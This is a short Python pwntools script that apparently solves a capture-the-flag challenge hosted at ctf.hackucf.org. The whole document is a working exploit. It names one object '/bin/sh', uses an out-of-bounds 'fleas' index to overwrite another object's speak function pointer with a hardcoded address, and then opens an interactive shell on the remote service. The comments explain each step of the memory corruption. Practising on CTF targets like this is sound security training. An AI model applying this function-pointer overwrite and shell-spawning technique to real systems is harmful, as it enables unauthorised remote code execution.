from pwn import *
# Connect to remote server
io = remote('ctf.hackucf.org', 7004)
dog3addr = 134517777 # 0x08049411
io.recvuntil(b'name?')
# It doesnt matter what we name the first dog
io.sendline(b"a")
io.recvuntil(b'name?')
# Name this dog /bin/sh so when we call speak3_dog, it calls system(/bin/sh)
io.sendline(b'/bin/sh')
# Now because the value of dog1->fleas[flea_location-1] = flea_count we can overwrite 
# the value of dog2-> speak_func to be dog3_speak so with the name /bin/sh = Win
io.recvuntil(b'fleas?')
io.sendline(b'8')
# time to send in the address of dog3_speak which will overwrite dog2->speak_func*
io.recvuntil(b'there?')
io.sendline(str(dog3addr))
io.interactive()